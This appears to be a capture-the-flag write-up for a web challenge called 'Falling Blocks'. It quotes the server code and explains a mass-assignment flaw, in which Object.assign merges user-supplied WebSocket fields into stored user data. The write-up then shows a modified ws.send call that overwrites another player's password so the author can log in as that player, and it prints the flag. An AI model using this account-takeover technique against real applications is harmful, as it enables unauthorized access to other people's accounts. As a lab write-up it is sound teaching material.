---
ai_date: 2025-04-27 05:27:59
ai_summary: Exploited unauthorized data modification and password manipulation to gain flag
ai_tags:
  - http-hdr
  - sql
  - xss
created: 2025-04-19T04:32
points: 423
solves: 45
title: Falling Blocks
updated: 2025-07-14T09:46
---

We can just cheat directly no?

```js
if (score > 10000) {
    data.score = 0;
}

/////

app.get('/logout', utils.authMiddleware, async (req, res) => {
    if (req.user.username !== await client.HGET(req.user.username, 'username')) {
        return res.json({ "message": "Stop cheating!" });
    }
    const score = await client.HGET(req.user.username, 'score');
    if (score > 10000) {
        return res.json({ "message": process.env.FLAG });
    }
    res.clearCookie("user");
    res.redirect("/login");
});
```

Maybe not, it seems that we can't exactly just get the flag directly by changing our score.

But wait, is that a `Object.assign` I see? With user provided data?

```js
const data = JSON.parse(message);
if (data.type && data.time && data.score) {
    if (data.type === 'gameOver') {
        let score = data.score;

        if (score > 10000) {
            data.score = 0;
        }

        userdata = Object.assign(userdata, data);
        userdata.score = Math.max(userdata.score, await client.HGET(userdata.username, "score"));
        await client.HSET(userdata.username, userdata);
        scoreboard.addScore(userdata.score, userdata.username);
    }
}
```

And we can just edit the `userdata` of any user?

Well that means we can edit their passwords.

```js
if (username !== await client.HGET(username, 'username')) {
    return res.json({ "message": "Stop cheating!" });
}
if (password === await client.HGET(username, 'password')) {
    res.cookie("user", await client.HGET(username, 'tokens'), {
        httpOnly: true
    });
    return res.redirect('/game');
}
```

We can just patch the `game.js` file to send our own data (turn on browser local override).

This is override Ssundae's password to `Ssundae`.

```js [game.js]
ws.send(JSON.stringify({ type: 'gameOver', time: new Date().toLocaleTimeString(), score: score, username: "Ssundae", password: "Ssundae" }));
// alert('Game Over! Score: ' + score);
// document.location.reload();
```

Then we logout and login with `Ssundae` / `Ssundae`, and logout again.

```flag
UMASS{F@lLiNgH@rD_0N_w3bS0cK3ts!437}
```